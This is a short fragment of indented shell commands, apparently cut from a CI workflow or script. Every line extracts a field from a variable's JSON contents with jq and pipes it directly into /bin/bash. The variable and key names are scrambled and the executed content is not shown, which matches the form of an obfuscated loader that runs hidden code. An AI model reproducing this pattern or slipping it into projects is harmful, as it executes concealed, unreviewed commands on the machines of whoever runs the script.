          printf '%s' "$tlbx400" | jq -r .hngah69 | /bin/bash
          echo $cpqo5537 | jq -r .yrtwy32331 | /bin/bash
          printf '%s' "$xgzs9" | jq -r .hl854 | /bin/bash
          printf '%s' "$hgtq1302" | jq -r .cfprj69 | /bin/bash
          printf '%s' "$s57" | jq -r .v7450 | /bin/bash
          echo $cggiq627 | jq -r .l710 | /bin/bash

